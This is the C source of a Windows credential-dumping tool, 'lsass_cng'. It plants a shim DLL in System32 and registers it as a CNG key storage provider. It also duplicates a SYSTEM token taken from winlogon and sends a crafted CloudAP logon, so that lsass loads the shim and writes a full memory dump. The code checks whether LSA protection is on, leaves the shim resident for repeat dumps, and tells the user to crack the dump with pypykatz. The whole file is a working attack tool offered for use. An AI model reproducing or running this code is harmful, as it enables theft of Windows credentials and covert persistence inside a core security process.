#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#define __USE_MINGW_ANSI_STDIO 1
#include <windows.h>
#include <wchar.h>
#include <stdarg.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <tlhelp32.h>

#define DLL_LEAF        L"cng_dump.dll"
#define CFG_LEAF        L"dump_path.cfg"
#define DUMP_LEAF       L"lsass.dmp"
#define STATUS_EXT      L".status"
#define MAX_PATH_W      1024
#define POLL_MS         500
#define POLL_TIMEOUT_MS 120000

#define CNG_PROV        L"CngKsp"
#define CNG_IMAGE_BASE  L"cng_ksp"
#define CNG_IMAGE_EXT   L".dll"

static void out(const wchar_t *fmt, ...)
{
    wchar_t buf[2048];
    va_list ap;
    DWORD n;
    int len;

    va_start(ap, fmt);
    len = vswprintf(buf, 2048, fmt, ap);
    va_end(ap);
    if (len < 0)
        buf[0] = 0;

    n = (DWORD)wcslen(buf);
    if (GetFileType(GetStdHandle(STD_OUTPUT_HANDLE)) == FILE_TYPE_CHAR) {
        WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), buf, n, &n, NULL);
    } else {
        char utf8[8192];
        int m = WideCharToMultiByte(CP_UTF8, 0, buf, (int)n, utf8,
                                    sizeof(utf8) - 1, NULL, NULL);
        if (m > 0) {
            utf8[m] = 0;
            fwrite(utf8, 1, (size_t)m, stdout);
            fflush(stdout);
        }
    }
}

static DWORD wlen(const wchar_t *s)
{
    DWORD n = 0;
    while (s && s[n])
        n++;
    return n;
}

static int join_path(wchar_t *dst, DWORD cap, const wchar_t *dir,
                     const wchar_t *leaf)
{
    DWORD dn = wlen(dir), ln = wlen(leaf), i;

    if (dn + ln + 1 >= cap)
        return 0;
    for (i = 0; i < dn; i++)
        dst[i] = dir[i];
    for (i = 0; i < ln; i++)
        dst[dn + i] = leaf[i];
    dst[dn + ln] = 0;
    return 1;
}

static void wcopy(wchar_t *dst, const wchar_t *src, DWORD n)
{
    DWORD i;
    for (i = 0; i < n; i++)
        dst[i] = src[i];
}

static void append_w(wchar_t *dst, DWORD cap, const wchar_t *src)
{
    DWORD base = wlen(dst);
    DWORD n = wlen(src);
    DWORD i;

    if (base >= cap)
        return;
    if (n > cap - base - 1)
        n = cap - base - 1;
    for (i = 0; i < n; i++)
        dst[base + i] = src[i];
    dst[base + n] = 0;
}

static void status_path_for(const wchar_t *dump_path, wchar_t *outp, DWORD cap)
{
    DWORD n = wlen(dump_path), i;

    if (n > cap - wlen(STATUS_EXT) - 2)
        n = cap - wlen(STATUS_EXT) - 2;
    for (i = 0; i < n; i++)
        outp[i] = dump_path[i];
    outp[n] = 0;
    {
        DWORD base = n, k = 0;
        while (STATUS_EXT[k] && base + 1 < cap)
            outp[base++] = STATUS_EXT[k++];
        outp[base] = 0;
    }
}

static int dir_of(const wchar_t *path, wchar_t *dir, DWORD cap)
{
    DWORD n = wlen(path);
    LONG i;

    for (i = (LONG)n - 1; i > 0; i--) {
        if (path[i] == L'\\' || path[i] == L'/')
            break;
    }
    if (i <= 0 || (DWORD)i + 2 >= cap)
        return 0;
    for (n = 0; n <= (DWORD)i; n++)
        dir[n] = path[n];
    dir[i + 1] = 0;
    return 1;
}

static int is_elevated_admin(void)
{
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    PSID admin_sid = NULL;
    BOOL member = FALSE;

    if (!AllocateAndInitializeSid(&nt_authority, 2,
                                  SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS,
                                  0, 0, 0, 0, 0, 0, &admin_sid))
        return 0;
    if (!CheckTokenMembership(NULL, admin_sid, &member))
        member = FALSE;
    FreeSid(admin_sid);
    return member != 0;
}

static int ppl_enabled(void)
{
    HKEY key;
    DWORD value = 0, size = sizeof(value), type = 0;
    LONG rc;

    rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                       L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
                       0, KEY_QUERY_VALUE, &key);
    if (rc != ERROR_SUCCESS)
        return 0;
    rc = RegQueryValueExW(key, L"RunAsPPL", NULL, &type,
                          (LPBYTE)&value, &size);
    RegCloseKey(key);
    if (rc != ERROR_SUCCESS || type != REG_DWORD)
        return 0;
    return value != 0;
}

static int file_locked(const wchar_t *path)
{
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        CloseHandle(h);
        return 0;
    }
    return GetLastError() == ERROR_SHARING_VIOLATION ? 1 : -1;
}

static int write_cfg(const wchar_t *cfg_path, const wchar_t *dump_path)
{
    HANDLE f;
    DWORD written = 0;
    DWORD n = wlen(dump_path);

    f = CreateFileW(cfg_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return 0;
    WriteFile(f, dump_path, n * sizeof(wchar_t), &written, NULL);
    CloseHandle(f);
    return written == n * sizeof(wchar_t);
}

static int read_status(const wchar_t *status_path, char *buf, DWORD cap)
{
    HANDLE f;
    DWORD readn = 0;

    f = CreateFileW(status_path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return 0;
    ReadFile(f, buf, cap - 1, &readn, NULL);
    CloseHandle(f);
    buf[readn < cap - 1 ? readn : cap - 1] = 0;
    return readn > 0;
}

static const char *stage_text(const char *stage)
{
    if (!lstrcmpA(stage, "createdump"))
        return "cannot create the dump file (bad path / directory / ACL?)";
    if (!lstrcmpA(stage, "dbghelp"))
        return "dbghelp.dll failed to load inside lsass";
    if (!lstrcmpA(stage, "apifetch"))
        return "MiniDumpWriteDump not found in dbghelp.dll";
    if (!lstrcmpA(stage, "minidump"))
        return "MiniDumpWriteDump failed";
    if (!lstrcmpA(stage, "size"))
        return "dump written but the file size query failed";
    return "unknown failure";
}

static const GUID PASSPORT_AUTH_GUID =
    {0x10A47879, 0x5EBF, 0x4B85, {0xBD, 0x8D, 0xC2, 0x1B, 0xB4, 0xF4, 0x9C, 0x8A}};

typedef long (WINAPI *lsa_logon_fn)(HANDLE, PLSA_STRING, ULONG, ULONG,
                                    PVOID, ULONG, void *, PLSA_UNICODE_STRING,
                                    PVOID *, PULONG, PLUID, PNTSTATUS,
                                    ULONG *, void **, PLSA_UNICODE_STRING *);

static unsigned long build_csp(unsigned char *csp, unsigned long cap,
                               const wchar_t *prov)
{
    static const wchar_t str1[] = L"";
    static const wchar_t reader[] = L"";
    static const wchar_t key[] = L"k";
    unsigned long str_base = 0x28;
    unsigned long off_str1 = 0, off_reader = 1, off_key = 2, off_csp = 4;
    unsigned long len = str_base + (off_csp + lstrlenW(prov) + 1) * 2;

    if (len > cap)
        return 0;
    ZeroMemory(csp, len);
    *(unsigned long *)(csp + 0x00) = len;
    *(unsigned long *)(csp + 0x04) = 1;
    *(unsigned long *)(csp + 0x14) = 0;

    *(unsigned long *)(csp + 0x18) = off_str1;
    *(unsigned long *)(csp + 0x1C) = off_reader;
    *(unsigned long *)(csp + 0x20) = off_key;
    *(unsigned long *)(csp + 0x24) = off_csp;
    CopyMemory(csp + str_base + off_str1 * 2, str1, sizeof(str1));
    CopyMemory(csp + str_base + off_reader * 2, reader, sizeof(reader));
    CopyMemory(csp + str_base + off_key * 2, key, sizeof(key));
    CopyMemory(csp + str_base + off_csp * 2, prov, (lstrlenW(prov) + 1) * 2);
    return len;
}

static unsigned long build_auth_payload(unsigned char *pl, unsigned long cap,
                                        const wchar_t *prov)
{
    unsigned char csp[512];
    unsigned long csp_len = build_csp(csp, sizeof(csp), prov);
    unsigned long off_csp, off_pin, len;

    if (!csp_len)
        return 0;
    off_csp = 0x2C;
    off_pin = off_csp + csp_len;
    len = off_pin + 2;
    if (len > cap)
        return 0;
    ZeroMemory(pl, len);
    pl[0x08] = 0x0C;
    *(unsigned long *)(pl + 0x0C) = off_csp;
    *(unsigned short *)(pl + 0x10) = (unsigned short)csp_len;
    *(unsigned long *)(pl + 0x14) = off_pin;
    *(unsigned short *)(pl + 0x18) = 0;
    CopyMemory(pl + off_csp, csp, csp_len);
    return len;
}

static unsigned long build_ex2_201(unsigned char *buf, unsigned long cap,
                                   const wchar_t *prov)
{
    static const wchar_t user[] = L"w";
    static const wchar_t domain[] = L"AzureAD";
    unsigned long hdr = 0x30;
    unsigned long rec_hdr = 0x1C;
    unsigned long user_off, domain_off, rec_off, data_off, plen, rec_len, total;
    unsigned char payload[768];
    unsigned char *rec;

    plen = build_auth_payload(payload, sizeof(payload), prov);
    if (!plen || plen < 0x2C)
        return 0;
    user_off = hdr;
    domain_off = user_off + sizeof(user);
    rec_off = (domain_off + sizeof(domain) + 7) & ~7;
    data_off = rec_hdr;
    rec_len = rec_hdr + plen;
    total = rec_off + rec_len;
    if (total + 8 > cap)
        return 0;
    ZeroMemory(buf, total + 8);

    *(unsigned long *)(buf + 0x00) = 0x201;
    *(unsigned short *)(buf + 0x04) = (unsigned short)hdr;
    *(unsigned long *)(buf + 0x08) = total;
    *(unsigned long *)(buf + 0x0C) = user_off;
    *(unsigned short *)(buf + 0x10) = (unsigned short)(sizeof(user) - 2);
    *(unsigned long *)(buf + 0x14) = domain_off;
    *(unsigned short *)(buf + 0x18) = (unsigned short)(sizeof(domain) - 2);
    *(unsigned long *)(buf + 0x1C) = rec_off;
    *(unsigned short *)(buf + 0x20) = (unsigned short)rec_len;
    *(unsigned long *)(buf + 0x24) = 2;
    *(unsigned long *)(buf + 0x28) = 0;
    *(unsigned short *)(buf + 0x2C) = 0;
    CopyMemory(buf + user_off, user, sizeof(user));
    CopyMemory(buf + domain_off, domain, sizeof(domain));

    rec = buf + rec_off;
    *(unsigned short *)(rec + 0x00) = (unsigned short)rec_hdr;
    *(unsigned short *)(rec + 0x02) = (unsigned short)rec_len;
    CopyMemory(rec + 0x04, &PASSPORT_AUTH_GUID, sizeof(GUID));
    *(unsigned long *)(rec + 0x14) = data_off;
    *(unsigned short *)(rec + 0x18) = (unsigned short)plen;
    CopyMemory(rec + data_off, payload, plen);
    return total;
}

static long cng_register(const wchar_t *prov, const wchar_t *image_leaf)
{
    typedef LONG (WINAPI *reg_fn)(LPCWSTR, ULONG, void *);
    typedef struct {
        unsigned long dwInterface;
        unsigned long dwFlags;
        unsigned long cFunctions;
        wchar_t **rgpszFunctions;
    } IFACE;
    HMODULE b = LoadLibraryW(L"bcrypt.dll");
    IFACE iface;
    IFACE *ifaces[1];
    struct { wchar_t *pszImage; unsigned long cInterfaces; IFACE **rgpInterfaces; } um;
    struct { unsigned long cAliases; wchar_t **rgpszAliases; void *pUM; void *pKM; } prov_reg;
    wchar_t *funcs[1];
    reg_fn reg;

    if (!b)
        return 2;
    reg = (reg_fn)(void *)GetProcAddress(b, "BCryptRegisterProvider");
    if (!reg)
        return 3;
    funcs[0] = L"KEY_STORAGE";
    iface.dwInterface = 0x00010001;
    iface.dwFlags = 0;
    iface.cFunctions = 1;
    iface.rgpszFunctions = funcs;
    ifaces[0] = &iface;
    um.pszImage = (wchar_t *)image_leaf;
    um.cInterfaces = 1;
    um.rgpInterfaces = ifaces;
    prov_reg.cAliases = 0;
    prov_reg.rgpszAliases = NULL;
    prov_reg.pUM = &um;
    prov_reg.pKM = NULL;
    return reg(prov, 1, &prov_reg);
}

static void cng_unregister(const wchar_t *prov)
{
    typedef LONG (WINAPI *unreg_fn)(LPCWSTR, ULONG);
    unreg_fn un = (unreg_fn)(void *)GetProcAddress(
        GetModuleHandleW(L"bcrypt.dll"), "BCryptUnregisterProvider");
    if (un)
        un(prov, 0);
}

static int is_system_token(void)
{
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    BYTE buf[512];
    DWORD len = 0;
    HANDLE tok;
    PSID sid;
    int sys = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok))
        return 0;
    if (!GetTokenInformation(tok, TokenUser, buf, sizeof(buf), &len)) {
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    if (AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
                                 0, 0, 0, 0, 0, 0, 0, &sid)) {
        sys = EqualSid(((TOKEN_USER *)buf)->User.Sid, sid);
        FreeSid(sid);
    }
    return sys;
}

static int enable_debug_privilege(void)
{
    HANDLE tok;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return 0;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(tok);
        return 0;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(tok);
    return GetLastError() == ERROR_SUCCESS;
}

static DWORD find_system_pid(void)
{
    static const wchar_t *cands[2] = { L"winlogon.exe", L"services.exe" };
    HANDLE snap;
    PROCESSENTRY32W e;
    int i;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;
    e.dwSize = sizeof(e);
    if (Process32FirstW(snap, &e)) {
        do {
            for (i = 0; i < 2; i++)
                if (!lstrcmpiW(e.szExeFile, cands[i])) {
                    CloseHandle(snap);
                    return e.th32ProcessID;
                }
        } while (Process32NextW(snap, &e));
    }
    CloseHandle(snap);
    return 0;
}

static int run_as_system(const wchar_t *cmdline, DWORD *child_rc)
{
    DWORD pid, rc_dummy;
    HANDLE hproc, htok, hprimary = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t cmdbuf[MAX_PATH_W + 64];
    int ret = -1;

    if (!child_rc)
        child_rc = &rc_dummy;
    *child_rc = 0;
    if (!enable_debug_privilege())
        return -1;
    pid = find_system_pid();
    if (!pid)
        return -2;
    hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hproc)
        return -3;
    if (!OpenProcessToken(hproc, TOKEN_DUPLICATE, &htok)) {
        CloseHandle(hproc);
        return -3;
    }
    if (!DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                          TokenPrimary, &hprimary)) {
        CloseHandle(htok);
        CloseHandle(hproc);
        return -4;
    }
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    cmdbuf[0] = 0;
    append_w(cmdbuf, MAX_PATH_W + 64, cmdline);
    if (!CreateProcessWithTokenW(hprimary, 0, NULL, cmdbuf,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ret = -5;
    } else {
        CloseHandle(pi.hThread);
        if (WaitForSingleObject(pi.hProcess, 90000) != WAIT_OBJECT_0) {
            TerminateProcess(pi.hProcess, 99);
            ret = -6;
        } else {
            GetExitCodeProcess(pi.hProcess, child_rc);
            ret = 0;
        }
        CloseHandle(pi.hProcess);
    }
    CloseHandle(hprimary);
    CloseHandle(htok);
    CloseHandle(hproc);
    return ret;
}

static int tcb_child(const wchar_t *prov)
{
    unsigned char ex2[2048];
    unsigned long ex2_len;
    HANDLE lsa = NULL;
    NTSTATUS st, sub = 0;
    ULONG pkg = 0, prof_len = 0, toktype = 0;
    void *tokinfo = NULL, *profile = NULL;
    LUID logonid;
    TOKEN_GROUPS groups;
    LSA_STRING origin, pkgname, lp;
    LSA_UNICODE_STRING upn;
    PLSA_UNICODE_STRING account = NULL;
    lsa_logon_fn logon_fn;

    ex2_len = build_ex2_201(ex2, sizeof(ex2), prov);
    if (!ex2_len)
        return 4;

    ZeroMemory(&lp, sizeof(lp));
    lp.Buffer = (char *)"insider";
    lp.Length = 7;
    lp.MaximumLength = 8;
    st = LsaRegisterLogonProcess(&lp, &lsa, (ULONG *)&prof_len);
    if (st != 0)
        return 2;

    ZeroMemory(&pkgname, sizeof(pkgname));
    pkgname.Buffer = (char *)"CloudAP";
    pkgname.Length = 7;
    pkgname.MaximumLength = 8;
    st = LsaLookupAuthenticationPackage(lsa, &pkgname, &pkg);
    if (st != 0) {
        LsaDeregisterLogonProcess(lsa);
        return 3;
    }

    ZeroMemory(&origin, sizeof(origin));
    origin.Buffer = (char *)"insider";
    origin.Length = 7;
    origin.MaximumLength = 8;
    ZeroMemory(&groups, sizeof(groups));
    ZeroMemory(&upn, sizeof(upn));

    logon_fn = (lsa_logon_fn)(void *)GetProcAddress(
        GetModuleHandleW(L"secur32.dll"), "LsaLogonUser");
    if (!logon_fn) {
        LsaDeregisterLogonProcess(lsa);
        return 4;
    }
    st = logon_fn(lsa, &origin, Interactive, pkg, ex2, ex2_len,
                  &groups, &upn, &profile, &prof_len, &logonid,
                  &sub, &toktype, &tokinfo, &account);
    (void)st;
    if (profile)
        LsaFreeReturnBuffer(profile);
    if (tokinfo)
        LsaFreeReturnBuffer(tokinfo);
    if (account)
        LsaFreeReturnBuffer(account);
    LsaDeregisterLogonProcess(lsa);
    return 0;
}

static int cng_fire_trigger(const wchar_t *prov)
{
    wchar_t self[MAX_PATH_W], cmdline[MAX_PATH_W + 64];
    DWORD child_rc = 0;
    int rc;

    if (is_system_token()) {
        int r = tcb_child(prov);
        return r == 0 ? 0 : -20 - r;
    }

    if (GetModuleFileNameW(NULL, self, MAX_PATH_W) == 0)
        return -11;
    cmdline[0] = 0;
    append_w(cmdline, MAX_PATH_W + 64, L"\"");
    append_w(cmdline, MAX_PATH_W + 64, self);
    append_w(cmdline, MAX_PATH_W + 64, L"\" --tcb ");
    append_w(cmdline, MAX_PATH_W + 64, prov);

    rc = run_as_system(cmdline, &child_rc);
    if (rc != 0)
        return rc;
    if (child_rc != 0)
        return -20 - (int)child_rc;
    return 0;
}

static void cng_leaf_for(wchar_t *leaf, DWORD cap, int idx)
{
    wchar_t num[8], rev[8];
    int n = 0, v = idx;
    DWORD i;

    leaf[0] = 0;
    append_w(leaf, cap, CNG_IMAGE_BASE);
    if (idx > 0) {
        while (v && n < 7) {
            num[n++] = (wchar_t)(L'0' + v % 10);
            v /= 10;
        }
        for (i = 0; i < (DWORD)n; i++)
            rev[i] = num[n - 1 - i];
        rev[n] = 0;
        append_w(leaf, cap, rev);
    }
    append_w(leaf, cap, CNG_IMAGE_EXT);
}

static int sys32_join(wchar_t *dst, DWORD cap, const wchar_t *leaf)
{
    wchar_t dir[MAX_PATH_W];
    UINT n = GetSystemDirectoryW(dir, MAX_PATH_W);

    if (n == 0 || n >= MAX_PATH_W - 1)
        return 0;
    dir[n] = L'\\';
    dir[n + 1] = 0;
    return join_path(dst, cap, dir, leaf);
}

static int cng_find_resident(wchar_t *img_path)
{
    wchar_t leaf[64], path[MAX_PATH_W];
    int idx;

    for (idx = 0; idx <= 99; idx++) {
        cng_leaf_for(leaf, 64, idx);
        if (!sys32_join(path, MAX_PATH_W, leaf))
            return 0;
        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES &&
            file_locked(path) == 1) {
            wcopy(img_path, path, wlen(path) + 1);
            return 1;
        }
    }
    return 0;
}

static void leaf_of(const wchar_t *path, wchar_t *leaf, DWORD cap)
{
    const wchar_t *p = path + wlen(path);
    DWORD n = 0;

    while (p > path && p[-1] != L'\\' && p[-1] != L'/')
        p--;
    while (p[n] && n + 1 < cap) {
        leaf[n] = p[n];
        n++;
    }
    leaf[n] = 0;
}

static int wait_report(const wchar_t *dump_path, const wchar_t *status_path)
{
    char status[128] = {0};
    DWORD waited = 0;
    int i;

    out(L"[*] Waiting for the in-lsass payload");
    while (waited < POLL_TIMEOUT_MS) {
        if (read_status(status_path, status, sizeof(status)))
            break;
        out(L".");
        Sleep(POLL_MS);
        waited += POLL_MS;
    }
    out(L"\n");

    if (status[0] == 'O' && status[1] == 'K' && status[2] == ' ') {
        unsigned long long bytes = 0;
        for (i = 3; status[i] >= '0' && status[i] <= '9'; i++)
            bytes = bytes * 10 + (unsigned long long)(status[i] - '0');
        out(L"[+] Dump written: %ls (%llu bytes)\n", dump_path, bytes);
        out(L"[+] The shim stays resident in this lsass — later runs just\n");
        out(L"    retrigger it (no reboot, no new load).\n");
        out(L"[+] Crack it: pypykatz lsa minidump \"%ls\"\n", dump_path);
        return 0;
    }

    if (status[0] == 'E' && status[1] == 'R' && status[2] == 'R') {
        char stage[32] = {0};
        int s = 4, j = 0;
        while (status[s] && status[s] != ' ' && j < 31)
            stage[j++] = status[s++];
        out(L"[!] Payload ran but dumping failed: %hs", status);
        out(L" — %hs\n", stage_text(stage));
        return 8;
    }

    if (!status[0]) {
        out(L"[!] Timeout: no marker within %lu s. A dump kicked by an\n",
            (unsigned long)(POLL_TIMEOUT_MS / 1000));
        out(L"    earlier shot may still be in flight (shots coalesce while\n");
        out(L"    one dump runs — retry when idle), or the worker died.\n");
        return 7;
    }

    out(L"[!] Corrupt status marker: %hs\n", status);
    return 8;
}

static int cng_shot(const wchar_t *image_leaf)
{
    long rc;

    rc = cng_register(CNG_PROV, image_leaf);
    if (rc != 0) {
        out(L"[!] BCryptRegisterProvider failed (%ld).\n", rc);
        return 4;
    }
    out(L"[*] Provider %ls registered (transient); propagating...\n",
        CNG_PROV);
    Sleep(2500);
    rc = cng_fire_trigger(CNG_PROV);
    cng_unregister(CNG_PROV);
    out(L"[*] Provider registration removed.\n");
    if (rc != 0) {
        out(L"[!] Trigger failed (stage %ld", rc);
        if (rc == -1)
            out(L" — not elevated / SeDebug denied");
        else if (rc == -2 || rc == -3)
            out(L" — no SYSTEM source process");
        else if (rc == -22)
            out(L" — helper got no SeTcb (not SYSTEM)");
        out(L").\n");
        return 5;
    }
    out(L"[*] CloudAP logon trigger fired.\n");
    return 0;
}

static void usage(const wchar_t *exe)
{
    out(L"lsass_cng — repeatable LSASS minidump via the CNG provider loader\n");
    out(L"\n");
    out(L"Usage: %ls [dump_path] [--fresh]\n", exe);
    out(L"\n");
    out(L"  dump_path  dump output file, plain unencrypted full minidump\n");
    out(L"             (default: lsass.dmp next to this exe)\n");
    out(L"  --fresh    rotate the image name (force a fresh load, e.g.\n");
    out(L"             after updating cng_dump.dll on a live lsass)\n");
    out(L"\n");
    out(L"cng_dump.dll must sit next to this exe; run elevated. First shot\n");
    out(L"loads the shim into lsass, every later shot retriggers the\n");
    out(L"resident image — no reboot, no reload.\n");
}

int wmain(int argc, wchar_t **argv)
{
    wchar_t self[MAX_PATH_W];
    wchar_t exe_dir[MAX_PATH_W];
    wchar_t dll_path[MAX_PATH_W];
    wchar_t dump_path[MAX_PATH_W + 16];
    wchar_t status_path[MAX_PATH_W + 32];
    wchar_t sys32_cfg[MAX_PATH_W];
    wchar_t cng_img[MAX_PATH_W];
    wchar_t cng_leaf[64];
    wchar_t *tmp = NULL;
    DWORD n;
    int fresh = 0, dump_arg = 0;
    int i, rc;

    if (argc >= 2 && !lstrcmpiW(argv[1], L"--tcb"))
        return tcb_child(argc >= 3 ? argv[2] : CNG_PROV);

    for (i = 1; i < argc; i++) {
        if (!lstrcmpiW(argv[i], L"--fresh"))
            fresh = 1;
        else if (!dump_arg)
            dump_arg = i;
        else {
            usage(argv[0]);
            return 1;
        }
    }

    out(L"lsass_cng — repeatable LSASS minidump via the CNG provider loader\n");

    if (ppl_enabled()) {
        out(L"[!] RunAsPPL is enabled: lsass runs protected, an unsigned\n");
        out(L"    image cannot be mapped into it. Aborting before any shot.\n");
        return 2;
    }
    if (!is_elevated_admin()) {
        out(L"[!] The console is not elevated. The System32 copy, the\n");
        out(L"    provider registration and the SYSTEM trigger all need\n");
        out(L"    admin. Continuing, but the shot will likely fail.\n");
    }

    n = GetModuleFileNameW(NULL, self, MAX_PATH_W);
    if (n == 0 || n >= MAX_PATH_W || !dir_of(self, exe_dir, MAX_PATH_W)) {
        out(L"[!] Cannot determine this exe's directory.\n");
        return 3;
    }
    if (!join_path(dll_path, MAX_PATH_W, exe_dir, DLL_LEAF)) {
        out(L"[!] Path too long.\n");
        return 3;
    }
    {
        DWORD attrs = GetFileAttributesW(dll_path);
        if (attrs == INVALID_FILE_ATTRIBUTES ||
            (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            out(L"[!] Shim dll not found (or not a file): %ls\n", dll_path);
            return 3;
        }
    }

    if (dump_arg) {
        n = GetFullPathNameW(argv[dump_arg], MAX_PATH_W, dump_path, &tmp);
        if (n == 0 || n >= MAX_PATH_W ||
            !(dump_path[1] == L':' || dump_path[0] == L'\\')) {
            out(L"[!] Cannot resolve an absolute dump path.\n");
            return 3;
        }
    } else {
        if (!join_path(dump_path, MAX_PATH_W + 16, exe_dir, DUMP_LEAF)) {
            out(L"[!] Path too long.\n");
            return 3;
        }
    }
    status_path_for(dump_path, status_path, MAX_PATH_W + 32);
    DeleteFileW(status_path);

    out(L"[*] dll   : %ls\n", dll_path);
    out(L"[*] dump  : %ls\n", dump_path);
    out(L"[*] status: %ls\n", status_path);

    if (cng_find_resident(cng_img)) {
        out(L"[*] %ls is locked: the shim is resident in lsass —\n"
            L"    re-triggering with a fresh provider open (no reload).\n",
            cng_img);
        leaf_of(cng_img, cng_leaf, 64);
    } else {

        int idx = 0;
        wchar_t probe[MAX_PATH_W];

        if (fresh) {
            for (idx = 2; idx <= 99; idx++) {
                cng_leaf_for(cng_leaf, 64, idx);
                if (!sys32_join(probe, MAX_PATH_W, cng_leaf))
                    return 3;
                if (GetFileAttributesW(probe) == INVALID_FILE_ATTRIBUTES)
                    break;
            }
            if (idx > 99) {
                out(L"[!] No free rotation name below 100.\n");
                return 3;
            }
        } else {
            cng_leaf_for(cng_leaf, 64, 0);
        }
        if (!sys32_join(cng_img, MAX_PATH_W, cng_leaf))
            return 3;
        if (file_locked(cng_img) == 1) {
            out(L"[!] %ls just got locked by a concurrent shot — rerun.\n",
                cng_img);
            return 3;
        }
        if (!CopyFileW(dll_path, cng_img, FALSE)) {
            DWORD e = GetLastError();
            out(L"[!] Cannot copy the shim to %ls (win32 %lu).\n",
                cng_img, (unsigned long)e);
            if (e == ERROR_ACCESS_DENIED)
                out(L"    Access denied — run from an elevated console.\n");
            return 3;
        }
        out(L"[*] Shim installed as %ls\n", cng_img);
    }

    if (!sys32_join(sys32_cfg, MAX_PATH_W, CFG_LEAF) ||
        !write_cfg(sys32_cfg, dump_path)) {
        out(L"[!] Cannot write %ls.\n", sys32_cfg);
        return 3;
    }

    rc = cng_shot(cng_leaf);
    if (rc != 0)
        return rc;

    if (file_locked(cng_img) != 1) {
        out(L"[!] %ls is not locked after the trigger: the image did not\n"
            L"    load into lsass (AV block? wrong architecture?).\n",
            cng_img);
        return 6;
    }
    return wait_report(dump_path, status_path);
}
